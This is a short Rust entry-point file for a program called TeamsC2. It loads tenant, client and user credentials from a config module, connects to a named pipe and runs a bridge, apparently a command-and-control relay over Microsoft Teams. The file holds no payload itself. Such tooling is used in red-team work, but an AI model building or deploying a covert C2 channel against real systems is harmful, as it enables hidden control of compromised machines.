use std::error::Error;
use teamsc2::{TeamsC2, Config};

mod config;
use config::*;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    println!("Starting TeamsC2...");

    let config = Config {
        tenant_id: TENANT_ID.to_string(),
        client_id: CLIENT_ID.to_string(),
        username: USERNAME.to_string(),
        password: PASSWORD.to_string(),
    };

    println!("Connecting to pipe: {}", DEFAULT_PIPE_NAME);

    // Create and run the bridge
    let teamsc2 = TeamsC2::new(DEFAULT_PIPE_NAME, config).await?;
    
    match teamsc2.run().await {
        Ok(_) => println!("TeamsC2 stopped normally"),
        Err(e) => eprintln!("TeamsC2 stopped with error: {}", e),
    }

    Ok(())
}